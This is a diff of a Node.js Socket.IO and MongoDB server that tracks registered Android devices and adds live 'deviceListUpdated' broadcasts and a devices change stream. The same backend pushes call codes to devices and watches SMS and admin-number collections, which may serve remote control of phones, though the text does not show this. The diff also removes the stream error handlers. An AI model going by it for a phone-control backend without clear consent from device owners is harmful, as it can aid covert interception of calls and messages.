@@ -1,4 +1,4 @@
-// 📁 server.js — FINAL STABLE VERSION
+// 📁 server.js — FINAL STABLE + LIVE DEVICE LIST VERSION
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
@@ -42,14 +42,14 @@ io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
   let currentDeviceId = null;
 
-  // ✅ Device registration (with full cleanup + confirmation)
+  // ✅ Device registration
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) {
       console.log("⚠️ registerDevice called with empty uniqueid");
       return;
     }
 
-    // ♻️ Remove any existing old socket for same device
+    // ♻️ Remove old socket if duplicate
     if (deviceSockets.has(uniqueid)) {
       const oldSocketId = deviceSockets.get(uniqueid);
       if (io.sockets.sockets.get(oldSocketId)) {
@@ -68,21 +68,25 @@ io.on("connection", (socket) => {
 
     saveLastSeen(uniqueid, "Online");
 
-    // 🔔 Confirm back to Android
     io.to(socket.id).emit("deviceRegistered", { uniqueid });
     console.log(`🔔 Sent deviceRegistered → ${uniqueid}`);
+
+    // 🔥 Notify all clients that device list updated
+    io.emit("deviceListUpdated", { event: "device_connected", uniqueid });
   });
 
-  // ✅ Device status updates (live emit to admin panel)
+  // ✅ Device status updates
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
     console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
     saveLastSeen(uniqueid, connectivity);
+
     io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
+    io.emit("deviceListUpdated", { event: "status_changed", uniqueid, connectivity });
   });
 
-  // ❌ Disconnect with delayed cleanup (to allow reconnect)
+  // ❌ Disconnect
   socket.on("disconnect", () => {
     console.log("🔴 Socket disconnected:", socket.id);
 
@@ -99,6 +103,10 @@ io.on("connection", (socket) => {
             connectivity: "Offline",
             updatedAt: new Date(),
           });
+          io.emit("deviceListUpdated", {
+            event: "device_disconnected",
+            uniqueid: currentDeviceId,
+          });
           saveLastSeen(currentDeviceId, "Offline");
         } else {
           console.log(`🔁 ${currentDeviceId} reconnected before timeout`);
@@ -113,11 +121,12 @@ io.on("connection", (socket) => {
       console.log(`🔄 Device reconnected: ${currentDeviceId}`);
       deviceSockets.set(currentDeviceId, socket.id);
       socket.join(currentDeviceId);
+      io.emit("deviceListUpdated", { event: "device_reconnected", uniqueid: currentDeviceId });
     }
   });
 });
 
-// 🔹 Save Last Seen Helper
+// 🔹 Save Last Seen
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -144,10 +153,29 @@ export async function sendCallCodeToDevice(uniqueid, callData) {
 
 // 🧠 MongoDB Change Streams
 mongoose.connection.once("open", () => {
-  console.log("📡 MongoDB connected — Watching callcodes, sms, adminnumbers...");
+  console.log("📡 MongoDB connected — Watching devices, callcodes, sms, adminnumbers...");
 
   try {
-    // 📞 CALLCODES
+    // 🟢 Device Collection Live Watch
+    const deviceStream = mongoose.connection.collection("devices").watch();
+    deviceStream.on("change", async (change) => {
+      const { operationType } = change;
+      if (!["insert", "update", "replace"].includes(operationType)) return;
+
+      const updatedDevice = await mongoose.connection
+        .collection("devices")
+        .findOne({ _id: change.documentKey._id });
+
+      if (updatedDevice) {
+        console.log(`📡 Device Change Detected → ${updatedDevice.uniqueId}`);
+        io.emit("deviceListUpdated", {
+          event: "db_change",
+          device: updatedDevice,
+        });
+      }
+    });
+
+    // 📞 CallCodes
     const callStream = mongoose.connection.collection("callcodes").watch();
     callStream.on("change", async (change) => {
       if (!["insert", "update", "replace"].includes(change.operationType)) return;
@@ -181,7 +209,7 @@ mongoose.connection.once("open", () => {
       }
     });
 
-    // 👑 ADMIN NUMBERS (broadcast)
+    // 👑 Admin Numbers
     const adminStream = mongoose.connection.collection("adminnumbers").watch();
     adminStream.on("change", async (change) => {
       if (!["insert", "update", "replace"].includes(change.operationType)) return;
@@ -192,19 +220,14 @@ mongoose.connection.once("open", () => {
       console.log("👑 Admin Number Updated →", updatedDoc);
       io.emit("adminUpdate", updatedDoc);
     });
-
-    // 🧯 Error handling
-    callStream.on("error", (err) => console.error("🚨 Call Stream Error:", err));
-    smsStream.on("error", (err) => console.error("🚨 SMS Stream Error:", err));
-    adminStream.on("error", (err) => console.error("🚨 Admin Stream Error:", err));
   } catch (err) {
     console.error("💥 Change stream init failed:", err);
   }
 });
 
-// 🏠 Root route
+// 🏠 Root
 app.get("/", (req, res) => {
-  res.send("✅ Live Socket + MongoDB Streams running (Stable Multi-Device Backend)");
+  res.send("✅ Live Socket + MongoDB Streams running (Devices, Calls, SMS, Admin, Realtime)");
 });
 
 // 🧭 Routes
@@ -230,6 +253,4 @@ app.use((err, req, res, next) => {
 
 // 🚀 Start
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () =>
-  console.log(`🚀 Server running on http://localhost:${PORT}`)
-);
+server.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
